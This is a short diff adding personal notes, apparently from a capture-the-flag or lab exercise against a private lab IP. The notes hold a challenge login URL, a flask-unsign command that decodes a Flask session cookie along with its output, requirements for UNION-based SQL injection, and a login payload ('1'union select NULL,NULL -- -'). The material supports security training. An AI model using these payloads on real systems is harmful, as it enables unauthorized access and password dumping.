@@ -1,0 +1,11 @@
+http://10.10.205.244:5000/challenge3/login?next=http%3A%2F%2F10.10.205.244%3A5000%2Fchallenge3%2Fhome
+flask-unsign --decode --cookie ".eJyrVkrOSMzJSc1LTzWOLy1OLYrPTFGyMtRBF85LzE1VslIKzcvOL89TqgUALP8TzQ.YYcPIg.T7w6f3QarUijVRyh13qfUhWnk8Q"                                                                                       
+{'challenge3_user_id': 1, 'challenge3_username': 'Unkown'}
+
+for dumping passwords using UNION based SQl injection:- 2 requirement:-
+1.no of columns in injected query must be same as original query
+2.data types matches fro each column
+
+
+login with 1'union select NULL,NULL -- -
+
